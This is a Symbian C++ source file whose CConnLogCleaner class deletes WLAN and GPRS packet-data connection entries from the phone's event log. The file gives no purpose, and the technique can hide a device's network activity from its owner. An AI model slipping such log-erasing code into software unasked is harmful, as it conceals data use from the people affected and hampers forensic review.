/*
 * NtwLogCleaner.cpp
 *
 *  Created on: 08/nov/2010
 *      Author: Giovanna
 */

#include "ConnLogCleaner.h"

// This defines the Wlan log type
#define KLOGWLANDATAEVENTTYPE 0x1000595f
const TUid KLogWlanDataEventTypeUid = {KLOGWLANDATAEVENTTYPE};

CConnLogCleaner::CConnLogCleaner() :
	CActive(EPriorityStandard)
	{
	iCleanerState = EIdle;
	}

CConnLogCleaner* CConnLogCleaner::NewL()
	{
	CConnLogCleaner* self = CConnLogCleaner::NewLC();
	CleanupStack::Pop(); // self;
	return self;
	}

CConnLogCleaner* CConnLogCleaner::NewLC()
	{
	CConnLogCleaner* self = new (ELeave) CConnLogCleaner();
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

void CConnLogCleaner::ConstructL()
	{
	CActiveScheduler::Add(this);

	User::LeaveIfError(iFs.Connect());
	iLogClient = CLogClient::NewL(iFs);
	iLogView = CLogViewEvent::NewL(*iLogClient);
	iLogFilter = CLogFilter::NewL();
	 
	
	iWait = new (ELeave) CActiveSchedulerWait();
	}

CConnLogCleaner::~CConnLogCleaner()
	{
	Cancel();
	delete iWait;
	delete iLogView;
	delete iLogFilter;	
	delete iLogClient;		
	iFs.Close();
	}

void CConnLogCleaner::DoCancel()
	{
	if (iWait->IsStarted()) // ***
		iWait->AsyncStop(); // ***

	iCleanerState = EIdle;
	
	iLogView->Cancel();
	iLogClient->Cancel();
	
	}

TInt CConnLogCleaner::RunError(TInt /*aError*/)
	{
	return KErrNone;
	}

void CConnLogCleaner::RunL()
	{
	if (iWait->IsStarted())
		iWait->AsyncStop();

	TCleanerState completed = iCleanerState;

	if (iStatus.Int() != KErrNone) 
		{
		//__FLOG_2(_L("RunL Error:%d Func:%d"), iStatus.Int(), completed);
		}
	else
		{
		switch (completed)
			{
			case ECreatingView:
				break;
			case EReadingEntries:
				break;
			case EDeletingEntry:
				break;
			default:
				break;
			}
		}
	}

void CConnLogCleaner::StartWait()
	{
	if (iWait->IsStarted() != (TInt) ETrue)
		{
		//__FLOG(_L("StartWait"));
		iWait->Start();
		}
	}


void CConnLogCleaner::DeleteConnLogSyncL()
	{
	// Create the view on log
	if(iLogView->SetFilterL(*iLogFilter, iStatus))
	    {		
	    iCleanerState = ECreatingView;
	    SetActive();
	    StartWait();
	    if(iStatus.Int()!=KErrNone)
	    	return;
	    }
	else 
		return;
	
	// The filtered view has been successfully created
	// so issue a request to start processing logs onwards	
	if(iLogView->FirstL(iStatus))
		{	
	    iCleanerState = EReadingEntries;
	    SetActive();
	    StartWait();
	    if(iStatus.Int()!=KErrNone)
	    	return;
		}
	else
	   return;

	// We should be at first event in the log
	if((iLogView->Event().EventType() == KLogWlanDataEventTypeUid) || (iLogView->Event().EventType() == KLogPacketDataEventTypeUid))   
		{
		// issue the request to delete it
		iCleanerState = EDeletingEntry;
	    iLogClient->DeleteEvent(iLogView->Event().Id(),iStatus);
	    SetActive();
	    StartWait();
	    if(iStatus.Int()!=KErrNone)
	    	return;
		}
	}

void CConnLogCleaner::DeleteConnLogSyncL(TConnType aConnType)
	{
	
	TUid logType;
	if(aConnType == EWlan)
		{
		logType = KLogWlanDataEventTypeUid;
		}
	else if (aConnType == EGprs) 
		{
		logType = KLogPacketDataEventTypeUid;  
		}
	
	
	// Create the view on log
	if(iLogView->SetFilterL(*iLogFilter, iStatus))
	    {		
	        iCleanerState = ECreatingView;
	        SetActive();
	        StartWait();
	    }
	else 
		return;
	
	// The filtered view has been successfully created
	// so issue a request to start processing logs onwards	
	if(iLogView->FirstL(iStatus))
		{	
	    iCleanerState = EReadingEntries;
	    SetActive();
	    StartWait();
		}
	else
	   return;

	// We should be at first event in the log
	if(iLogView->Event().EventType() == logType) 
		{
		// issue the request to delete it
		iCleanerState = EDeletingEntry;
	    iLogClient->DeleteEvent(iLogView->Event().Id(),iStatus);
	    SetActive();
	    StartWait();
		}
	}
